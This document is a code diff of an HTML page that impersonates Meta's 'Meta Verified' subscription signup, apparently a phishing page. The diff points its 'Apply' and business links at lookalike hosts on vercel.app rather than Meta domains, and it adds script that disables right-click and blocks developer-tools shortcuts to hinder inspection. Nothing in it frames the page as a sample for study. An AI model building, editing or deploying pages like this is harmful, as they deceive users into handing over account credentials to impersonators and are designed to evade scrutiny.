@@ -1,14 +1,12 @@
 
-
-
-<!DOCTYPE html><html lang="en"><head>
-    <meta charset="UTF-8">
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Home</title>
-    <link href="bootstrap.min.css" rel="stylesheet">
+    <link href="style.css" rel="stylesheet">
+    <link rel="icon" href="https://pbs.twimg.com/media/GQB99gQaQAEUOZ7?format=png&amp;name=small">
     <style>
-        /* CSS styles */
-
         body {
             font-family: system-ui;
             margin: 0;
@@ -17,20 +15,6 @@
 
         .container-fluid {
             background: #F5F6F6;
-        }
-
-        .container {
-            padding: 1rem;
-        }
-
-        .logo {
-            width: 9rem;
-            height: 6rem;
-        }
-
-        .meta-logo {
-            width: 4rem;
-            height: 4rem;
         }
 
         .btn {
@@ -43,9 +27,7 @@
             display: inline-block;
             margin-top: 1rem;
             font-family: Arial, sans-serif;
-            /* Same font family */
             font-size: 16px;
-            /* Adjust as needed */
         }
 
         .content {
@@ -63,37 +45,30 @@
             font-size: 18px;
             margin-top: 1rem;
             font-family: Arial, sans-serif;
-            /* Same font family */
         }
 
         .sign-up {
             font-size: 17px;
             padding-top: 1rem;
             font-family: Arial, sans-serif;
-            /* Same font family */
         }
 
         .business-info {
             font-size: 14px;
             font-family: Arial, sans-serif;
-            /* Same font family */
         }
 
         .region-info {
-            font-size: 13px;
-            font-style: italic;
+            font-size: small;
+            opacity: 95%;
             font-family: Arial, sans-serif;
-            /* Same font family */
         }
 
         .image {
             display: none;
             width: 42%;
             height: 100vh;
-            /* Ensure full height */
             background-size: cover;
-            /* background-position: center; */
-            /* margin-left: 5rem; */
         }
 
         @media (min-width: 576px) {
@@ -106,37 +81,39 @@
 
 <body>
     <div class="container-fluid">
-        <div class="container">
-            <img src="meta-logo-primary_standardsize.svg" alt="logo" class="logo">
-        </div>
+<img width="120px" src="2560px-Meta-Logo.png" alt="Meta Logo">
     </div>
     <div class="content">
         <div class="col-sm-6">
-            <img src="800px-Twitter_Verified_Badge.svg.png" alt="meta" class="meta-logo">
+<img width="80px" src="IMGremovebg.png" alt="Meta Verified Icon">
             <h1 class="my-3 fs-1">Become <br> Meta Verified</h1>
             <div style="margin-bottom: 30px;"></div>
-            <a class='btn' href='/next.html'>Apply</a>
+
+            <a href="https://meta-id0285.vercel.app/" class="btn">Apply</a>
+
             <p class="mt-4">Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.</p>
             <p class="sign-up">Sign up now for creators</p>
             <p class="mt-4 mb-0">
                 <span class="fw-semibold">Are you a business?</span> Get more information on
             </p>
-            <a href="#" class="business-info">Meta verified for businesses</a>
-            <p class="mt-4 font-italic region-info">Features, availability, and pricing may vary by region.</p>
+            <a href="https://meta-id933442.vercel.app/" class="business-info">Meta verified for businesses</a> <br><br>
+            <i class="region-info">Features, availability, and pricing may vary by region.</i>
         </div>
-        <div class="col-sm-5 image" style="background-image: url('background.png'); "></div>
+        <div class="col-sm-5 image" style="background-image: url(&#39;https://pbs.twimg.com/media/GPUPRg0a8AACTSj?format=jpg&amp;name=small&#39;);"></div>
     </div>
 
-<script>
-    document.addEventListener('contextmenu', event => {
-        event.preventDefault();
-    });
+    <script>
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.shiftKey || e.key === "I" || e.key === "i")) {
+                e.preventDefault();
+            }
+        };
+    </script>
 
-    setTimeout(function() {
-    var redirectURL = "request.html"; // Updated URL
-    window.location.replace(redirectURL);
-    }, 3000); // 3000 milliseconds (3 seconds)
-    });
-</script>
+
+
 
 </body></html>
